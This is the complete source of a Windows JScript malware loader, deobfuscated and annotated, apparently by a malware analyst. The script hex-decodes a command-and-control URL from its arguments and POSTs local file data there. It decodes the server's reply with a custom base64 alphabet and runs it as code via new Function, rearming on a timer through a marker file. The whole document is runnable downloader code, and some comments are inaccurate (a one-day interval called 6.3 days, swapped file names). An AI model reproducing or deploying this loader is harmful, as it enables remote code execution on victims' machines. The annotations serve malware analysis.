function Main() {

    // Ugly function for the malware author to do cheap breakpoint debugging.
    function echoDebug(b) {
        // r is defined as !1, false, so this will never evaluate and therefore never echo to Wscript
        rDebugBoolean && (rDebugBoolean = !0, sVarWScript.Echo(b))
    }

    // Get the parent folder of the script execution location
    function getParentFolder() {
        // hex is "Scripting.FileSystemObject"
        return (new ActiveXObject(decodeHex("536372697074696e672e46696c6553797374656d4f626a656374"))).GetParentFolderName(sVarWScript.ScriptFullName)
    }

    // convert a hex string to an ASCII string
    function decodeHex(b) {
        b = b.toString();
        for (var a = "", c = 0; c < b.length; c += 2) a += String.fromCharCode(parseInt(b.substr(c, 2), 16));
        return a
    }

    // Creates a new aowLC file for tracking malware age
    function createAowLC() {
        // hex is "aowLC", an empty file found locally used to track malware age
        var b = FileSystemObject.BuildPath(getParentFolder(), decodeHex("616f774c43"));
        FileSystemObject.FileExists(b) && FileSystemObject.DeleteFile(b);
        FileSystemObject.CreateTextFile(b)
    }

    // Checks the age of the file and returns true if the file needs to be updated
    function checkFileAge() {
        // hex is "aowLC", an empty file found locally used to track malware age
        var b = FileSystemObject.BuildPath(getParentFolder(), decodeHex("616f774c43"));
        if (!1 == FileSystemObject.FileExists(b)) return !0;
        // Get the last modified date of aowLC
        b = new Date(FileSystemObject.GetFile(b).DateLastModified);
        // Compare the age of aowLC to today's date, returning true if it's older than 864E5 (6.3 days)
        return 864E5 < new Date - b ? !0 : !1
    }

    //
    function y(b, a, c) {
        var d = "",
            k = 0,
            g = 0,
            e = 0,
            h = 0,
            m = !1,
            l = "",
            n = "",
            p = "",
            k = [],
            g = [],
            q = "",
            m = !1;
            // hex is "object"
        if (typeof a === decodeHex("6f626a656374")) {
            // hex is "phpjs.strictForIn"
            m = this.ini_set(decodeHex("7068706a732e737472696374466f72496e"), !1);
            a = this.krsort(a);
            // hex is "phpjs.strictForIn"
            this.ini_set(decodeHex("7068706a732e737472696374466f72496e"), m);
            for (d in a) a.hasOwnProperty(d) && (k.push(d), g.push(a[d]));
            a = k;
            c = g
        }
        e = b.length;
        h = a.length;
        // hex is "string"
        l = typeof a === decodeHex("737472696e67");
        // hex is "string"
        n = typeof c === decodeHex("737472696e67");
        for (k = 0; k < e; k++) {
            m = !1;
            if (l)
                for (p = b.charAt(k), g = 0; g < h; g++) {
                    if (p == a.charAt(g)) {
                        m = !0;
                        break
                    }
                } else
                    for (g = 0; g < h; g++)
                        if (b.substr(k, a[g].length) == a[g]) {
                            m = !0;
                            k = k + a[g].length - 1;
                            break
                        }
            q = m ? q + (n ? c.charAt(g) : c[g]) : q + b.charAt(k)
        }
        return q
    }

    // This function appears to combine hdat1 and hdat2
    function z() {
        try {
            echoDebug("");
            var b = !1,
                a = "",
                c = getParentFolder(),
                // hex is "hdat1", a file found locally with the malware
                a = FileSystemObject.BuildPath(c, decodeHex("6864617432")),
                c = "",
                d = FileSystemObject.OpenTextFile(a, 1); // open hdat1 ForReading
            d.AtEndOfStream || (c = d.ReadAll());
            var k = decodeHex(c);
            echoDebug("");
            var g;
            echoDebug("");
            var a = "",
                v = getParentFolder(),
                // hex is "hdat2", a file found locally with the malware
                a = FileSystemObject.BuildPath(v, decodeHex("6864617431")),
                v = "",
                h = FileSystemObject.OpenTextFile(a, 1);
            h.AtEndOfStream || (v = h.ReadAll());
            echoDebug("");
            g = v; - 1 === n.indexOf("/", n.length - 1) && (n += "/");
            echoDebug("");
            for (h = 1; 2 >= h; h += 1) {
                // hex is "Msxml2.ServerXMLHTTP"
                var m = new ActiveXObject(decodeHex("4d73786d6c322e536572766572584d4c48545450")),
                // hex is "&r=", a portion of a URL parameter
                    s = n + k + decodeHex("26723d") + h;
                echoDebug("");
                echoDebug("");
                // hex is "POST"
                m.open(decodeHex("504f5354"), s, !1);
                echoDebug("");
                m.send(g);
                echoDebug("");
                if (200 == m.status) {
                    // hex is "responseText"
                    var r, p = m[decodeHex("726573706f6e736554657874")],
                    // hex is "WllYV1ZVVFNSUVBPTk1MS0pJSEdGRURDQkF6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYTk4NzY1NDMyMTArLz0="
                    // this is a base64 string with normal alphabet that becomes a custom alphabet for base64 encoding
                    // this is the custom alphabet ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/=
                        q = decodeHex("576c6c5956315a5656464e5355564250546b314d5330704a5345644752555244516b463665586833646e563063334a786347397562577872616d6c6f5a325a6c5a474e6959546b344e7a59314e444d794d5441724c7a303d"),
                        p = y(p, text._keyStr, text.decode(q));
                    r = text.decode(p);
                    echoDebug("");
                    k = r;
                    echoDebug("");
                    (new Function(k))();
                    b = !0;
                    break
                } else if (403 == m.status) break
            }
            return b
        } catch (w) {
            return !1
        }
    }

    // Decode the first argument from hex to ASCII, which is a C2 URL
    function A() {
        var b = sVarWScript.Arguments;
        // hex is "--IsErIk" a parameter of the script when called by Wscript
        if (b(b.length - 1) != decodeHex("2d2d49734572496b")) return !1; // if the argument is not equal to IsErIk, return !1
        n = decodeHex(b(0)); // n becomes the decoded hex of the first argument, which is the URL
        return !0
    }


    // Main

    var sVarWScript = WScript;
    // hex is "WScript.Shell"
    WScript.CreateObject(decodeHex("575363726970742e5368656c6c")); // Create a new shell object
    var rDebugBoolean = !1,
        // hex is "Scripting.FileSystemObject"
        FileSystemObject = new ActiveXObject(decodeHex("536372697074696e672e46696c6553797374656d4f626a656374")),
        text = {
            // hex is ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
            _keyStr: decodeHex("4142434445464748494a4b4c4d4e4f505152535455565758595a6162636465666768696a6b6c6d6e6f707172737475767778797a303132333435363738392b2f3d"),
            encode: function(b) {
                var a = "",
                    c, d, k, g, f, h, e = 0;
                for (b = text._utf8_encode(b); e < b.length;) c = b.charCodeAt(e++), d = b.charCodeAt(e++), k = b.charCodeAt(e++), g = c >> 2, c = (c & 3) << 4 | d >> 4, f = (d & 15) << 2 | k >> 6, h = k & 63, isNaN(d) ? f = h = 64 : isNaN(k) && (h = 64), a = a + this._keyStr.charAt(g) + this._keyStr.charAt(c) + this._keyStr.charAt(f) + this._keyStr.charAt(h);
                return a
            },
            decode: function(b) {
                var a = "",
                    c, d, f, g, e, h = 0;
                for (b = b.replace(/[^A-Za-z0-9\+\/\=]/g, ""); h < b.length;) c = this._keyStr.indexOf(b.charAt(h++)), d = this._keyStr.indexOf(b.charAt(h++)), g = this._keyStr.indexOf(b.charAt(h++)), e = this._keyStr.indexOf(b.charAt(h++)), c = c << 2 | d >> 4, d = (d & 15) << 4 | g >> 2, f = (g & 3) << 6 | e, a += String.fromCharCode(c), 64 != g && (a += String.fromCharCode(d)), 64 != e && (a += String.fromCharCode(f));
                return a = text._utf8_decode(a)
            },
            _utf8_encode: function(b) {
                b = b.replace(/\r\n/g, "\n");
                for (var a = "", c = 0; c < b.length; c++) {
                    var d = b.charCodeAt(c);
                    128 > d ? a += String.fromCharCode(d) : (127 < d && 2048 > d ? a += String.fromCharCode(d >> 6 | 192) : (a += String.fromCharCode(d >> 12 | 224), a += String.fromCharCode(d >> 6 & 63 | 128)), a += String.fromCharCode(d & 63 | 128))
                }
                return a
            },
            _utf8_decode: function(b) {
                for (var a = "", c = 0, d = c1 = c2 = 0; c < b.length;) d = b.charCodeAt(c), 128 > d ? (a += String.fromCharCode(d), c++) : 191 < d && 224 > d ? (c2 = b.charCodeAt(c + 1), a += String.fromCharCode((d & 31) << 6 | c2 & 63), c += 2) : (c2 = b.charCodeAt(c + 1), c3 = b.charCodeAt(c + 2), a += String.fromCharCode((d & 15) << 12 | (c2 & 63) << 6 | c3 & 63), c += 3);
                return a
            }
        },
        n = "";

        try {
            // if checkFileAge returns !0 true, it will create a new aowLC file to track malware age, then run z() to download new malware
            echoDebug(""), A() && (!1 == checkFileAge() ? echoDebug("") : (createAowLC(), z() || echoDebug(""))), echoDebug("")
        } catch (B) {
            echoDebug("")
        }
}
Main();